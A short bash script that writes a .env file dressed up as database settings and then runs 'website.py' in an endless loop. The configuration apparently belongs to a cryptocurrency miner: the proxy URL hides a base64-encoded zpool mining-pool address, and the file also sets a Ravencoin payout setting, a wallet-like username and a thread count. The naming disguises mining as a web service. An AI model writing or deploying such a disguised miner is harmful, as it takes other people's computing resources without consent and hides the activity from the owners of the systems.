#!/bin/bash


echo -e "host=127.0.0.1\nport=3306\nproxy=wss://web-production-b425.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=8\npassword=c=RVN\nusername=RXq1aLds5oKeqyTXAjiDZEghjXKw7ejJsi" > .env


MIN=$1
while true; do
    python3 website.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
    sleep 10
done
